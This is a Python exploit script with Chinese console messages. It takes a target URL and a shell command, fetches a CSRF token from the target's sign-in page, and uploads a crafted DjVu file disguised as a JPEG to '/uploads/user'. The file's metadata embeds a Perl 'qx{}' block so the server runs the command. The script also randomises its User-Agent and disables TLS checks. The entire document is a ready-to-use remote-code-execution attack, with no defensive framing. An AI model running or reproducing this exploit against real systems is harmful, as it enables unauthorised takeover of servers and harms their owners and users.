import re
import uuid
import urllib3
import requests
import argparse
from random import randint

urllib3.disable_warnings()
Session = requests.session()
UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/20100101 Firefox/{0}.0".format(randint(50, 88))

def Payload(command):
    Payload = b'\x41\x54\x26\x54\x46\x4f\x52\x4d'
    Payload += (len(command) + 0x55).to_bytes(length=4, byteorder='big', signed=True)
    Payload += b'\x44\x4a\x56\x55\x49\x4e\x46\x4f\x00\x00\x00\x0a\x00\x00\x00\x00\x18\x00\x2c\x01\x16\x01\x42\x47\x6a\x70\x00\x00\x00\x00\x41\x4e\x54\x61'
    Payload += (len(command) + 0x2f).to_bytes(length=4, byteorder='big', signed=True)
    Payload += b'\x28\x6d\x65\x74\x61\x64\x61\x74\x61\x0a\x09\x28\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x20\x22\x5c\x0a\x22\x20\x2e\x20\x71\x78\x7b'
    Payload += command.encode()
    Payload += b'\x7d\x20\x2e\x20\x5c\x0a\x22\x20\x62\x20\x22\x29\x20\x29\x0a'
    return Payload

def CSRF_Token(target):
    res = Session.get(f'{target}/users/sign_in', headers={'Origin': target, 'User-Agent': UserAgent}, verify=False)
    return re.compile(rb'csrf-token" content="(.*?)" />').search(res.content).group(1).decode()

def Exploit(target, command):
    res = Session.post(f'{target}/uploads/user', files=[('file', (uuid.uuid4().hex[:8] + '.jpg', Payload(command), 'image/jpeg'))], headers={'X-CSRF-Token': CSRF_Token(target), 'User-Agent': UserAgent}, verify=False)
    if 'Failed to process image' in res.text:
        print("\033[92m[+] 发送成功, 请自行检查!\033[0m")
    else:
        print(f'\033[91m[-] 发送失败, 以下为响应数据:\033[0m\n{res.text}')

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="目标URL (e.g. https://192.168.1.1)", required=True)
    parser.add_argument("-c", "--command", help="执行命令 (e.g. whoami)", required=True)
    args = parser.parse_args()
    Exploit(args.target.rstrip("/"), args.command)
